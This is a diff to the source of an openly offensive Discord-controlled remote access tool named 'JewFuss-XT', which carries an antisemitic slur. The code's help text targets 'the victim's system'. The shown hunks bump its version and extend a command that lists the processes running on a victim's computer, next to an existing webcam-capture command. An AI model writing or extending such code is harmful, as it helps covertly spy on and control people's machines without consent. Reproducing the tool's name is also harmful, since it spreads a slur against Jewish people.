@@ -54,7 +54,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.9.4" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.9.5" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False - 28f93g
 
 intents = discord.Intents.all()
@@ -2677,17 +2677,33 @@ async def webcampic(ctx, cam: int = 0):
     except Exception as e:
         await ctx.send(f"Error executing webcam capture command: {str(e)}")
 
-@bot.command(help="Lists all running tasks on the victim's system.", usage="$tasks")
-async def tasks(ctx):
+@bot.command(aliases=["tasklist"], help="Lists all running tasks on the victim's system.", usage="$tasks")
+async def tasks(ctx, arg: str = ""):
     try:
-        processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
-        processes.sort(key=lambda p: (p['name'] or '').lower())
+        norm = str.maketrans("", "", "- _.")
+        arg = (arg or "").strip()
+        arg_norm = arg.lower().translate(norm) if arg else ""
+
+        processes = [p.info for p in psutil.process_iter(["pid", "name"])]
+        processes.sort(key=lambda p: (p.get("name") or "").lower())
+
         text = ""
         for proc in processes:
-            if proc['name'] and proc['name'] != "":
-                text += f"{proc['name']} - {proc['pid']}\n"
-        buffer = io.BytesIO(text.encode('utf-8'))
-        await ctx.send("List of running tasks:", file=discord.File(fp=buffer, filename="tasks.txt"))
+            name = (proc.get("name") or "").strip()
+            pid = proc.get("pid")
+
+            if not name:
+                continue
+
+            name_norm = name.lower().translate(norm)
+
+            if arg_norm and arg_norm not in name_norm:
+                continue
+
+            text += f"{name} - {pid}\n"
+
+        await ctx.fm_send(content=text, filename="tasks.txt")
+
     except Exception as e:
         await ctx.send(f"Error: Could not list tasks. {str(e)}")
 
